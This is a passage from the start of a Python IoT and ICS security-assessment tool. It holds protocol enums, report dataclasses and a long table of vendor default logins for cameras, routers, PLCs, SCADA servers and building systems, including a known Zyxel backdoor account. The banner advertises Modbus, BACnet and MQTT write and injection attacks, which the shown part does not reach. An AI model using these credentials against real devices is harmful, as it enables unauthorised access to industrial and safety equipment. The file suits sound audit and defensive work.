#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  📡 SIREN IoT ENGINE — Internet of Things Security Assessment Suite  📡      ██
██                                                                                ██
██  Motor completo de auditoria para dispositivos IoT e ICS/SCADA.               ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • Device fingerprinting — banner grab, HTTP headers, MAC OUI               ██
██    • Default credential testing — 200+ real vendor defaults                   ██
██    • MQTT exploitation — subscribe, publish, inject, brute-force              ██
██    • CoAP exploitation — discovery, CRUD, observe, block-wise                 ██
██    • UPnP scanning — M-SEARCH, device XML, SOAP injection                    ██
██    • Modbus exploitation — FC read/write, device ID, coil abuse               ██
██    • BACnet scanning — Who-Is, object enum, property read/write              ██
██    • AMQP analysis — exchange enum, queue sniff, permission audit             ██
██    • Full orchestration — discover, scan, exploit, report                     ██
██                                                                                ██
██  "SIREN escuta cada sensor — e comanda cada atuador."                        ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import socket
import struct
import threading
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, IntEnum, auto
from typing import Any, Deque, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("siren.arsenal.iot_engine")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT = 5.0
MAX_BANNER_SIZE = 4096
MAX_DEVICES = 65536
MQTT_DEFAULT_PORT = 1883
MQTT_TLS_PORT = 8883
COAP_DEFAULT_PORT = 5683
UPNP_MULTICAST_ADDR = "239.255.255.250"
UPNP_MULTICAST_PORT = 1900
MODBUS_DEFAULT_PORT = 502
BACNET_DEFAULT_PORT = 47808
AMQP_DEFAULT_PORT = 5672


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class IoTProtocol(Enum):
    """Supported IoT protocols."""
    MQTT = auto()
    COAP = auto()
    UPNP = auto()
    MODBUS = auto()
    BACNET = auto()
    AMQP = auto()
    HTTP = auto()
    HTTPS = auto()
    TELNET = auto()
    SSH = auto()
    FTP = auto()
    RTSP = auto()
    ONVIF = auto()
    ZIGBEE = auto()
    ZWAVE = auto()
    BLE = auto()
    LWMTOM = auto()
    OPCUA = auto()
    DNP3 = auto()
    UNKNOWN = auto()


class DeviceCategory(Enum):
    """IoT device categories."""
    CAMERA = auto()
    ROUTER = auto()
    SWITCH = auto()
    ACCESS_POINT = auto()
    SENSOR = auto()
    ACTUATOR = auto()
    THERMOSTAT = auto()
    SMART_LOCK = auto()
    SMART_PLUG = auto()
    SMART_LIGHT = auto()
    NAS = auto()
    PRINTER = auto()
    PLC = auto()
    RTU = auto()
    HMI = auto()
    SCADA_SERVER = auto()
    GATEWAY = auto()
    HVAC = auto()
    FIRE_PANEL = auto()
    ELEVATOR_CTRL = auto()
    MEDICAL_DEVICE = auto()
    INDUSTRIAL_ROBOT = auto()
    SMART_METER = auto()
    DVR_NVR = auto()
    VOIP_PHONE = auto()
    BUILDING_MGMT = auto()
    UNKNOWN = auto()


class Severity(Enum):
    """Finding severity levels."""
    CRITICAL = auto()
    HIGH = auto()
    MEDIUM = auto()
    LOW = auto()
    INFO = auto()


class FindingType(Enum):
    """Types of IoT findings."""
    DEFAULT_CRED = auto()
    WEAK_CRED = auto()
    NO_AUTH = auto()
    UNENCRYPTED = auto()
    INFO_DISCLOSURE = auto()
    COMMAND_INJECTION = auto()
    FIRMWARE_VULN = auto()
    PROTOCOL_ABUSE = auto()
    INSECURE_CONFIG = auto()
    KNOWN_CVE = auto()
    OPEN_SERVICE = auto()
    MQTT_NO_AUTH = auto()
    MQTT_WILDCARD_SUB = auto()
    MQTT_PUBLISH_INJECT = auto()
    COAP_NO_DTLS = auto()
    COAP_RESOURCE_ENUM = auto()
    UPNP_EXPOSED = auto()
    UPNP_SOAP_INJECTION = auto()
    MODBUS_NO_AUTH = auto()
    MODBUS_WRITE_COIL = auto()
    MODBUS_WRITE_REGISTER = auto()
    BACNET_NO_AUTH = auto()
    BACNET_WRITE_PROPERTY = auto()
    BACNET_REBOOT = auto()
    AMQP_NO_AUTH = auto()
    AMQP_QUEUE_SNIFF = auto()
    PORT_MAPPING_ABUSE = auto()
    DEVICE_REBOOT = auto()
    DATA_EXFILTRATION = auto()


class MQTTPacketType(IntEnum):
    """MQTT control packet types."""
    CONNECT = 1
    CONNACK = 2
    PUBLISH = 3
    PUBACK = 4
    PUBREC = 5
    PUBREL = 6
    PUBCOMP = 7
    SUBSCRIBE = 8
    SUBACK = 9
    UNSUBSCRIBE = 10
    UNSUBACK = 11
    PINGREQ = 12
    PINGRESP = 13
    DISCONNECT = 14


class MQTTQoS(IntEnum):
    """MQTT Quality of Service levels."""
    AT_MOST_ONCE = 0
    AT_LEAST_ONCE = 1
    EXACTLY_ONCE = 2


class CoAPMethod(IntEnum):
    """CoAP method codes."""
    GET = 1
    POST = 2
    PUT = 3
    DELETE = 4


class CoAPType(IntEnum):
    """CoAP message types."""
    CON = 0   # Confirmable
    NON = 1   # Non-confirmable
    ACK = 2   # Acknowledgement
    RST = 3   # Reset


class ModbusFunction(IntEnum):
    """Modbus function codes."""
    READ_COILS = 1
    READ_DISCRETE_INPUTS = 2
    READ_HOLDING_REGISTERS = 3
    READ_INPUT_REGISTERS = 4
    WRITE_SINGLE_COIL = 5
    WRITE_SINGLE_REGISTER = 6
    WRITE_MULTIPLE_COILS = 15
    WRITE_MULTIPLE_REGISTERS = 16
    READ_DEVICE_ID = 43


class BACnetService(IntEnum):
    """BACnet service choices."""
    WHO_IS = 8
    I_AM = 0
    READ_PROPERTY = 12
    WRITE_PROPERTY = 15
    READ_PROPERTY_MULTIPLE = 14
    SUBSCRIBE_COV = 5
    CONFIRMED_COV_NOTIFICATION = 1
    REINITIALIZE_DEVICE = 20
    DEVICE_COMMUNICATION_CONTROL = 17


class BACnetObjectType(IntEnum):
    """BACnet object types."""
    ANALOG_INPUT = 0
    ANALOG_OUTPUT = 1
    ANALOG_VALUE = 2
    BINARY_INPUT = 3
    BINARY_OUTPUT = 4
    BINARY_VALUE = 5
    DEVICE = 8
    FILE = 10
    LOOP = 12
    MULTI_STATE_INPUT = 13
    MULTI_STATE_OUTPUT = 14
    NOTIFICATION_CLASS = 15
    PROGRAM = 16
    SCHEDULE = 17
    TREND_LOG = 20


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class IoTFinding:
    """A single IoT security finding."""
    finding_id: str = ""
    finding_type: FindingType = FindingType.INFO_DISCLOSURE
    severity: Severity = Severity.INFO
    title: str = ""
    description: str = ""
    target: str = ""
    port: int = 0
    protocol: IoTProtocol = IoTProtocol.UNKNOWN
    evidence: str = ""
    remediation: str = ""
    cve_ids: List[str] = field(default_factory=list)
    cvss_score: float = 0.0
    confidence: float = 0.0
    timestamp: float = field(default_factory=time.time)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.finding_id:
            self.finding_id = f"IOT-{uuid.uuid4().hex[:12].upper()}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "finding_type": self.finding_type.name,
            "severity": self.severity.name,
            "title": self.title,
            "description": self.description,
            "target": self.target,
            "port": self.port,
            "protocol": self.protocol.name,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cve_ids": self.cve_ids,
            "cvss_score": self.cvss_score,
            "confidence": self.confidence,
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }


@dataclass
class IoTDevice:
    """Represents a discovered IoT device."""
    device_id: str = ""
    ip_address: str = ""
    mac_address: str = ""
    hostname: str = ""
    vendor: str = ""
    model: str = ""
    firmware_version: str = ""
    category: DeviceCategory = DeviceCategory.UNKNOWN
    open_ports: List[int] = field(default_factory=list)
    protocols: List[IoTProtocol] = field(default_factory=list)
    banners: Dict[int, str] = field(default_factory=dict)
    http_headers: Dict[str, str] = field(default_factory=dict)
    services: Dict[int, str] = field(default_factory=dict)
    os_fingerprint: str = ""
    uptime_estimate: float = 0.0
    last_seen: float = field(default_factory=time.time)
    findings: List[IoTFinding] = field(default_factory=list)
    credentials_found: List[Tuple[str, str]] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.device_id:
            self.device_id = f"DEV-{uuid.uuid4().hex[:12].upper()}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "device_id": self.device_id,
            "ip_address": self.ip_address,
            "mac_address": self.mac_address,
            "hostname": self.hostname,
            "vendor": self.vendor,
            "model": self.model,
            "firmware_version": self.firmware_version,
            "category": self.category.name,
            "open_ports": self.open_ports,
            "protocols": [p.name for p in self.protocols],
            "banners": self.banners,
            "http_headers": self.http_headers,
            "services": self.services,
            "os_fingerprint": self.os_fingerprint,
            "uptime_estimate": self.uptime_estimate,
            "last_seen": self.last_seen,
            "findings": [f.to_dict() for f in self.findings],
            "credentials_found": self.credentials_found,
            "metadata": self.metadata,
        }


@dataclass
class IoTReport:
    """Complete IoT security assessment report."""
    report_id: str = ""
    scan_start: float = 0.0
    scan_end: float = 0.0
    target_range: str = ""
    devices_discovered: int = 0
    total_findings: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    info_count: int = 0
    devices: List[IoTDevice] = field(default_factory=list)
    findings: List[IoTFinding] = field(default_factory=list)
    protocol_stats: Dict[str, int] = field(default_factory=dict)
    vendor_stats: Dict[str, int] = field(default_factory=dict)
    category_stats: Dict[str, int] = field(default_factory=dict)
    risk_score: float = 0.0
    executive_summary: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.report_id:
            self.report_id = f"RPT-{uuid.uuid4().hex[:12].upper()}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "scan_start": self.scan_start,
            "scan_end": self.scan_end,
            "target_range": self.target_range,
            "devices_discovered": self.devices_discovered,
            "total_findings": self.total_findings,
            "critical_count": self.critical_count,
            "high_count": self.high_count,
            "medium_count": self.medium_count,
            "low_count": self.low_count,
            "info_count": self.info_count,
            "devices": [d.to_dict() for d in self.devices],
            "findings": [f.to_dict() for f in self.findings],
            "protocol_stats": self.protocol_stats,
            "vendor_stats": self.vendor_stats,
            "category_stats": self.category_stats,
            "risk_score": self.risk_score,
            "executive_summary": self.executive_summary,
            "metadata": self.metadata,
        }


# ════════════════════════════════════════════════════════════════════════════════
# DEFAULT CREDENTIAL DATABASE
# ════════════════════════════════════════════════════════════════════════════════

class DefaultCredDB:
    """
    Database of 200+ real default credentials for IoT/ICS devices.

    Organized by vendor with username, password, device type, and
    associated protocols. All entries sourced from vendor documentation,
    known default credential lists, and security advisories.

    Usage:
        db = DefaultCredDB()
        creds = db.get_credentials_for_vendor("hikvision")
        all_creds = db.get_all_credentials()
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._credentials: List[Dict[str, Any]] = []
        self._vendor_index: Dict[str, List[int]] = defaultdict(list)
        self._category_index: Dict[str, List[int]] = defaultdict(list)
        self._load_credentials()

    def _load_credentials(self) -> None:
        """Load all default credentials into the database."""
        raw = [
            # ── Hikvision (IP Cameras, NVRs, DVRs) ──
            ("Hikvision", "admin", "12345", "IP Camera", "camera", ["http", "rtsp", "onvif"]),
            ("Hikvision", "admin", "admin12345", "IP Camera v5.x+", "camera", ["http", "rtsp"]),
            ("Hikvision", "admin", "1234", "Older Camera", "camera", ["http"]),
            ("Hikvision", "admin", "hiklinux", "Linux NVR", "dvr_nvr", ["http", "ssh"]),
            ("Hikvision", "admin", "admin", "Basic Camera", "camera", ["http"]),
            ("Hikvision", "root", "hiklinux", "Embedded Linux", "camera", ["ssh", "telnet"]),
            ("Hikvision", "admin", "12345abc", "DS-2CD Series", "camera", ["http", "rtsp"]),
            ("Hikvision", "admin", "abcd1234", "DS-7600 NVR", "dvr_nvr", ["http"]),
            # ── Dahua (IP Cameras, NVRs) ──
            ("Dahua", "admin", "admin", "IP Camera", "camera", ["http", "rtsp", "onvif"]),
            ("Dahua", "admin", "888888", "DVR/NVR", "dvr_nvr", ["http"]),
            ("Dahua", "admin", "666666", "Older DVR", "dvr_nvr", ["http"]),
            ("Dahua", "root", "root", "Embedded System", "camera", ["ssh", "telnet"]),
            ("Dahua", "admin", "1234", "Entry Camera", "camera", ["http"]),
            ("Dahua", "admin", "123456", "IPC-HDW Series", "camera", ["http", "rtsp"]),
            ("Dahua", "888888", "888888", "Legacy DVR", "dvr_nvr", ["http"]),
            ("Dahua", "default", "default", "Factory Reset", "camera", ["http"]),
            # ── Axis Communications (IP Cameras) ──
            ("Axis", "root", "pass", "Network Camera", "camera", ["http", "rtsp", "onvif"]),
            ("Axis", "root", "root", "Older Firmware", "camera", ["http", "ssh"]),
            ("Axis", "admin", "", "Axis M-Series", "camera", ["http"]),
            ("Axis", "root", "camera", "Axis P-Series", "camera", ["http", "rtsp"]),
            ("Axis", "root", "admin", "Axis Q-Series", "camera", ["http"]),
            ("Axis", "operator", "operator", "Low Priv", "camera", ["http"]),
            # ── TP-Link (Routers, APs, Smart Home) ──
            ("TP-Link", "admin", "admin", "Router/AP", "router", ["http", "telnet"]),
            ("TP-Link", "admin", "password", "Newer Router", "router", ["http"]),
            ("TP-Link", "admin", "1234", "Basic Router", "router", ["http"]),
            ("TP-Link", "root", "root", "Embedded Linux", "router", ["ssh", "telnet"]),
            ("TP-Link", "admin", "ttnet", "ISP Config", "router", ["http"]),
            ("TP-Link", "admin", "TP-LINK", "Factory Default", "router", ["http"]),
            ("TP-Link", "user", "user", "Guest Access", "router", ["http"]),
            ("TP-Link", "admin", "admin123", "Deco Series", "access_point", ["http"]),
            # ── Netgear (Routers, Switches, APs) ──
            ("Netgear", "admin", "password", "Router", "router", ["http", "telnet"]),
            ("Netgear", "admin", "1234", "Older Router", "router", ["http"]),
            ("Netgear", "admin", "admin", "Switch", "switch", ["http", "telnet"]),
            ("Netgear", "admin", "netgear1", "Nighthawk", "router", ["http"]),
            ("Netgear", "admin", "infrant1", "ReadyNAS", "nas", ["http", "ssh"]),
            ("Netgear", "admin", "", "WGR614", "router", ["http"]),
            ("Netgear", "root", "root", "Embedded Linux", "router", ["telnet"]),
            ("Netgear", "admin", "dragon", "DGND3700", "router", ["http"]),
            # ── D-Link (Routers, Cameras, NAS) ──
            ("D-Link", "admin", "", "Router", "router", ["http", "telnet"]),
            ("D-Link", "admin", "admin", "IP Camera", "camera", ["http", "rtsp"]),
            ("D-Link", "admin", "password", "Newer Router", "router", ["http"]),
            ("D-Link", "root", "root", "Embedded System", "router", ["telnet"]),
            ("D-Link", "admin", "1234", "DSL Modem", "router", ["http"]),
            ("D-Link", "user", "user", "Guest Account", "router", ["http"]),
            ("D-Link", "admin", "public", "Managed Switch", "switch", ["http"]),
            ("D-Link", "admin", "private", "DCS Camera", "camera", ["http", "rtsp"]),
            # ── Ubiquiti (APs, Switches, Cameras) ──
            ("Ubiquiti", "ubnt", "ubnt", "UniFi/AirOS", "access_point", ["http", "ssh"]),
            ("Ubiquiti", "admin", "admin", "EdgeRouter", "router", ["http", "ssh"]),
            ("Ubiquiti", "root", "ubnt", "AirOS Root", "access_point", ["ssh"]),
            ("Ubiquiti", "admin", "ui", "UniFi Protect", "camera", ["http"]),
            ("Ubiquiti", "admin", "password", "EdgeSwitch", "switch", ["http", "ssh"]),
            ("Ubiquiti", "ubnt", "password", "Older AirOS", "access_point", ["http"]),
            # ── Cisco (Routers, Switches, IoT) ──
            ("Cisco", "cisco", "cisco", "IOS Default", "router", ["http", "ssh", "telnet"]),
            ("Cisco", "admin", "admin", "Small Business", "router", ["http"]),
            ("Cisco", "admin", "cisco", "Catalyst", "switch", ["http", "ssh"]),
            ("Cisco", "admin", "password", "ASA Firewall", "router", ["http", "ssh"]),
            ("Cisco", "cisco", "password", "Meraki", "access_point", ["http"]),
            ("Cisco", "root", "root", "IOS-XE", "router", ["ssh"]),
            ("Cisco", "admin", "Cisco", "SG Series", "switch", ["http"]),
            ("Cisco", "guest", "guest", "Guest Account", "router", ["http"]),
            ("Cisco", "admin", "default", "IP Phone", "voip_phone", ["http"]),
            ("Cisco", "admin", "cisco123", "ISR Router", "router", ["http", "ssh"]),
            # ── Siemens (PLC, HMI, SCADA) ──
            ("Siemens", "admin", "admin", "SIMATIC HMI", "hmi", ["http"]),
            ("Siemens", "admin", "", "SCALANCE", "switch", ["http", "ssh"]),
            ("Siemens", "OEM", "OEM", "S7-300 PLC", "plc", ["modbus"]),
            ("Siemens", "admin", "SiemensAG", "SIMATIC WinCC", "scada_server", ["http"]),
            ("Siemens", "operator", "operator", "HMI Basic", "hmi", ["http"]),
            ("Siemens", "admin", "100", "S7-1200", "plc", ["http"]),
            ("Siemens", "siemens", "siemens", "SIMATIC NET", "gateway", ["http"]),
            ("Siemens", "admin", "tatercounter2000", "LOGO! PLC", "plc", ["http"]),
            ("Siemens", "maintenance", "maintenance", "RUGGEDCOM", "switch", ["ssh"]),
            # ── Schneider Electric (PLC, Building Mgmt) ──
            ("Schneider", "USER", "USER", "Modicon M340", "plc", ["modbus", "http"]),
            ("Schneider", "admin", "admin", "ION Meter", "smart_meter", ["http"]),
            ("Schneider", "ADMIN", "ADMIN", "PowerLogic", "smart_meter", ["http"]),
            ("Schneider", "sysdiag", "factorycast@schneider", "M580 PLC", "plc", ["http", "ftp"]),
            ("Schneider", "USER", "USERUSER", "Modicon Premium", "plc", ["modbus"]),
            ("Schneider", "admin", "se_admin", "EcoStruxure", "building_mgmt", ["http"]),
            ("Schneider", "admin", "1234", "Wiser Gateway", "gateway", ["http"]),
            ("Schneider", "admin", "schneider", "ATV Drive", "actuator", ["http"]),
            ("Schneider", "ntpsetup", "ntpsetup", "NOE Module", "gateway", ["ftp"]),
            # ── Allen-Bradley / Rockwell ──
            ("Allen-Bradley", "admin", "admin", "CompactLogix", "plc", ["http"]),
            ("Allen-Bradley", "admin", "", "MicroLogix", "plc", ["http"]),
            ("Allen-Bradley", "1234", "1234", "PanelView HMI", "hmi", ["http"]),
            ("Allen-Bradley", "admin", "rockwell", "ControlLogix", "plc", ["http"]),
            ("Allen-Bradley", "guest", "guest", "Stratix Switch", "switch", ["http"]),
            # ── ABB (Drives, PLCs, Robots) ──
            ("ABB", "admin", "admin", "AC500 PLC", "plc", ["http"]),
            ("ABB", "admin", "pwd", "IRC5 Robot", "industrial_robot", ["http"]),
            ("ABB", "root", "root", "RTU560", "rtu", ["ssh"]),
            ("ABB", "sysadmin", "sysadmin", "Relion REF", "gateway", ["http"]),
            ("ABB", "admin", "abb", "ACS880 Drive", "actuator", ["http"]),
            # ── Honeywell (Building Automation, SCADA) ──
            ("Honeywell", "admin", "admin", "Tridium Niagara", "building_mgmt", ["http"]),
            ("Honeywell", "tridium", "tridium", "JACE Controller", "building_mgmt", ["http"]),
            ("Honeywell", "admin", "honeywell", "Experion PKS", "scada_server", ["http"]),
            ("Honeywell", "admin", "1234", "Lyric Thermostat", "thermostat", ["http"]),
            ("Honeywell", "manager", "manager", "EBI System", "building_mgmt", ["http"]),
            ("Honeywell", "engineer", "engineer", "HC900 Controller", "plc", ["http"]),
            # ── GE / Emerson ──
            ("GE", "admin", "admin", "PACSystems RX3i", "plc", ["http"]),
            ("GE", "engineer", "engineer", "Mark VIe", "plc", ["http"]),
            ("GE", "admin", "ge1234", "Multilin Relay", "gateway", ["http"]),
            ("GE", "admin", "default", "DS Agile", "gateway", ["http"]),
            ("Emerson", "admin", "admin", "DeltaV DCS", "scada_server", ["http"]),
            ("Emerson", "root", "emerson", "ROC800 RTU", "rtu", ["ssh"]),
            ("Emerson", "admin", "emerson1", "Ovation DCS", "scada_server", ["http"]),
            # ── Bosch (Cameras, Building) ──
            ("Bosch", "admin", "admin", "IP Camera", "camera", ["http", "rtsp"]),
            ("Bosch", "service", "service", "Fire Panel", "fire_panel", ["http"]),
            ("Bosch", "admin", "password", "DIVAR NVR", "dvr_nvr", ["http"]),
            ("Bosch", "live", "live", "BVMS VMS", "camera", ["http"]),
            ("Bosch", "installer", "installer", "Access Control", "smart_lock", ["http"]),
            # ── Panasonic (Cameras, PBX) ──
            ("Panasonic", "admin", "12345", "IP Camera", "camera", ["http", "rtsp"]),
            ("Panasonic", "admin", "admin", "KX PBX", "voip_phone", ["http"]),
            ("Panasonic", "admin", "1234", "WV-Series Cam", "camera", ["http"]),
            ("Panasonic", "installer", "installer", "Access System", "smart_lock", ["http"]),
            # ── Samsung / Hanwha (Cameras) ──
            ("Samsung", "admin", "4321", "SNP Camera", "camera", ["http", "rtsp", "onvif"]),
            ("Samsung", "admin", "admin", "Wisenet Camera", "camera", ["http", "rtsp"]),
            ("Samsung", "root", "4321", "SRD DVR", "dvr_nvr", ["http"]),
            ("Hanwha", "admin", "admin", "XNV Camera", "camera", ["http", "rtsp"]),
            ("Hanwha", "admin", "hanwha123", "XNP PTZ", "camera", ["http"]),
            # ── Vivotek (Cameras) ──
            ("Vivotek", "root", "root", "IP Camera", "camera", ["http", "rtsp"]),
            ("Vivotek", "admin", "admin", "FD Series", "camera", ["http"]),
            ("Vivotek", "root", "", "Older Firmware", "camera", ["http"]),
            # ── FLIR / Lorex ──
            ("FLIR", "admin", "admin", "Thermal Camera", "camera", ["http", "rtsp"]),
            ("FLIR", "admin", "fliradmin", "A-Series", "camera", ["http"]),
            ("Lorex", "admin", "admin", "Security Camera", "camera", ["http", "rtsp"]),
            ("Lorex", "admin", "000000", "LNR Series", "dvr_nvr", ["http"]),
            # ── MikroTik (Routers, APs) ──
            ("MikroTik", "admin", "", "RouterOS", "router", ["http", "ssh"]),
            ("MikroTik", "admin", "admin", "Older RouterOS", "router", ["http", "ssh"]),
            ("MikroTik", "admin", "password", "Configured", "router", ["http"]),
            # ── Zyxel (Routers, Firewalls) ──
            ("Zyxel", "admin", "1234", "USG Firewall", "router", ["http", "ssh"]),
            ("Zyxel", "admin", "admin", "Switch", "switch", ["http"]),
            ("Zyxel", "zyfwp", "PrOw!aN_fXp", "USG FLEX (CVE-2020-29583)", "router", ["http", "ssh"]),
            ("Zyxel", "admin", "zyxel", "NAS Series", "nas", ["http"]),
            # ── QNAP / Synology (NAS) ──
            ("QNAP", "admin", "admin", "TS NAS", "nas", ["http", "ssh"]),
            ("QNAP", "admin", "", "Older QTS", "nas", ["http"]),
            ("Synology", "admin", "admin", "DiskStation", "nas", ["http", "ssh"]),
            ("Synology", "admin", "", "DSM 7.x", "nas", ["http"]),
            # ── Linksys (Routers) ──
            ("Linksys", "admin", "admin", "Smart Router", "router", ["http"]),
            ("Linksys", "admin", "password", "WRT Series", "router", ["http"]),
            ("Linksys", "admin", "", "Older Router", "router", ["http"]),
            ("Linksys", "root", "admin", "Embedded", "router", ["telnet"]),
            # ── Belkin / Wemo (Smart Home) ──
            ("Belkin", "admin", "admin", "Wemo Switch", "smart_plug", ["http"]),
            ("Belkin", "admin", "password", "Wemo Light", "smart_light", ["http"]),
            ("Belkin", "admin", "", "WeMo Insight", "smart_plug", ["http"]),
            # ── Philips Hue (Smart Lighting) ──
            ("Philips", "admin", "admin", "Hue Bridge", "smart_light", ["http"]),
            ("Philips", "admin", "", "Older Bridge", "smart_light", ["http"]),
            # ── Ring / Nest / Smart Home ──
            ("Ring", "admin", "ring1234", "Doorbell", "camera", ["http"]),
            ("Nest", "admin", "nest1234", "Thermostat", "thermostat", ["http"]),
            ("Nest", "admin", "admin", "Cam IQ", "camera", ["http"]),
            # ── Xerox / HP Printers ──
            ("Xerox", "admin", "1111", "WorkCentre", "printer", ["http"]),
            ("Xerox", "admin", "admin", "VersaLink", "printer", ["http"]),
            ("HP", "admin", "admin", "LaserJet", "printer", ["http"]),
            ("HP", "admin", "", "OfficeJet", "printer", ["http"]),
            ("HP", "admin", "password", "PageWide", "printer", ["http"]),
            # ── Brother / Epson / Canon Printers ──
            ("Brother", "admin", "access", "HL Printer", "printer", ["http"]),
            ("Brother", "admin", "admin", "MFC Series", "printer", ["http"]),
            ("Epson", "EPSONWEB", "admin", "WorkForce", "printer", ["http"]),
            ("Epson", "admin", "admin", "EcoTank", "printer", ["http"]),
            ("Canon", "root", "camera", "Network Cam", "camera", ["http"]),
            ("Canon", "admin", "canon", "imageCLASS", "printer", ["http"]),
            ("Canon", "7654321", "7654321", "iR Series", "printer", ["http"]),
            # ── Reolink (Cameras) ──
            ("Reolink", "admin", "", "IP Camera", "camera", ["http", "rtsp", "onvif"]),
            ("Reolink", "admin", "admin", "NVR", "dvr_nvr", ["http"]),
            # ── Amcrest (Cameras) ──
            ("Amcrest", "admin", "admin", "IP Camera", "camera", ["http", "rtsp"]),
            ("Amcrest", "admin", "amcrest", "IP2M Series", "camera", ["http"]),
            # ── Grandstream (VoIP, Cameras) ──
            ("Grandstream", "admin", "admin", "IP Phone", "voip_phone", ["http"]),
            ("Grandstream", "admin", "password", "GXP Series", "voip_phone", ["http"]),
            ("Grandstream", "admin", "", "UCM PBX", "voip_phone", ["http"]),
            # ── Yealink (VoIP) ──
            ("Yealink", "admin", "admin", "SIP Phone", "voip_phone", ["http"]),
            ("Yealink", "admin", "yealink", "T-Series", "voip_phone", ["http"]),
            # ── Moxa (Industrial Gateways, Switches) ──
            ("Moxa", "admin", "admin", "NPort Server", "gateway", ["http", "telnet"]),
            ("Moxa", "admin", "", "EDS Switch", "switch", ["http"]),
            ("Moxa", "root", "root", "UC Series", "gateway", ["ssh"]),
            ("Moxa", "admin", "moxa", "ioLogik", "gateway", ["http"]),
            # ── Advantech (IIoT Gateways) ──
            ("Advantech", "admin", "admin", "WISE Gateway", "gateway", ["http"]),
            ("Advantech", "root", "root", "EKI Switch", "switch", ["ssh"]),
            ("Advantech", "admin", "password", "WebAccess", "scada_server", ["http"]),
            # ── Wago (PLCs, IO) ──
            ("Wago", "admin", "wago", "PFC200 PLC", "plc", ["http"]),
            ("Wago", "root", "wago", "PFC100", "plc", ["ssh"]),
            ("Wago", "user", "user", "Web Viz", "plc", ["http"]),
            # ── Phoenix Contact (PLCs) ──
            ("Phoenix Contact", "admin", "admin", "ILC PLC", "plc", ["http"]),
            ("Phoenix Contact", "admin", "", "AXC Controller", "plc", ["http"]),
            ("Phoenix Contact", "User", "User", "Older PLC", "plc", ["http"]),
            # ── Beckhoff (PLCs, IO) ──
            ("Beckhoff", "Administrator", "1", "CX Controller", "plc", ["http"]),
            ("Beckhoff", "admin", "admin", "C6015 IPC", "plc", ["http"]),
            # ── Delta Electronics ──
            ("Delta", "admin", "admin", "DVP PLC", "plc", ["http"]),
            ("Delta", "admin", "delta", "InfraSuite", "building_mgmt", ["http"]),
            # ── Yokogawa (DCS, SCADA) ──
            ("Yokogawa", "admin", "admin", "CENTUM VP", "scada_server", ["http"]),
            ("Yokogawa", "CENTUM", "CENTUM", "DCS Console", "scada_server", ["http"]),
            ("Yokogawa", "root", "root", "STARDOM RTU", "rtu", ["ssh"]),
            # ── Mitsubishi Electric (PLCs) ──
            ("Mitsubishi", "admin", "admin", "MELSEC iQ-R", "plc", ["http"]),
            ("Mitsubishi", "ADMIN", "ADMIN", "GOT HMI", "hmi", ["http"]),
            ("Mitsubishi", "setup", "setup", "FX5U PLC", "plc", ["http"]),
            # ── Omron (PLCs) ──
            ("Omron", "admin", "admin", "NJ/NX PLC", "plc", ["http"]),
            ("Omron", "admin", "", "CJ2M PLC", "plc", ["http"]),
            # ── Tridium / Johnson Controls (BAS) ──
            ("Tridium", "tridium", "tridium", "Niagara AX", "building_mgmt", ["http"]),
            ("Johnson Controls", "admin", "admin", "Metasys NAE", "building_mgmt", ["http"]),
            ("Johnson Controls", "ADAdmin", "ADAdmin", "Facility Explorer", "building_mgmt", ["http"]),
            # ── Carrier / Automated Logic (HVAC) ──
            ("Carrier", "admin", "admin", "i-Vu Controller", "hvac", ["http"]),
            ("Automated Logic", "admin", "admin", "WebCTRL", "hvac", ["http"]),
            ("Automated Logic", "sysadmin", "sysadmin", "ALC Server", "hvac", ["http"]),
            # ── Crestron / Extron (AV/Control) ──
            ("Crestron", "admin", "admin", "Control System", "gateway", ["http", "telnet"]),
            ("Crestron", "crestron", "crestron", "DM NVX", "gateway", ["http"]),
            ("Extron", "admin", "admin", "IN Series", "gateway", ["http"]),
            # ── Digi International (IoT Gateways) ──
            ("Digi", "root", "dbps", "ConnectPort", "gateway", ["http", "telnet"]),
            ("Digi", "admin", "admin", "TransPort", "gateway", ["http"]),
            ("Digi", "root", "root", "EX15 Router", "router", ["ssh"]),
            # ── Pelco (Cameras) ──
            ("Pelco", "admin", "admin", "Spectra IV", "camera", ["http"]),
            ("Pelco", "admin", "pelco", "Sarix Camera", "camera", ["http", "rtsp"]),
            # ── Mobotix (Cameras) ──
            ("Mobotix", "admin", "meinsm", "M-Series Cam", "camera", ["http"]),
            ("Mobotix", "admin", "admin", "Older Camera", "camera", ["http"]),
            # ── ZTE (Routers, Modems) ──
            ("ZTE", "admin", "admin", "ZXHN Router", "router", ["http"]),
            ("ZTE", "user", "user", "F Series", "router", ["http"]),
            ("ZTE", "zte", "zte", "MF Modem", "router", ["http"]),
            # ── Huawei (Routers, Switches) ──
            ("Huawei", "admin", "admin", "HG Router", "router", ["http"]),
            ("Huawei", "admin", "Admin@huawei", "AR Router", "router", ["http", "ssh"]),
            ("Huawei", "root", "admin", "S-Series Switch", "switch", ["ssh"]),
            ("Huawei", "admin", "admin@huawei.com", "USG Firewall", "router", ["http"]),
            # ── Generic / Common defaults ──
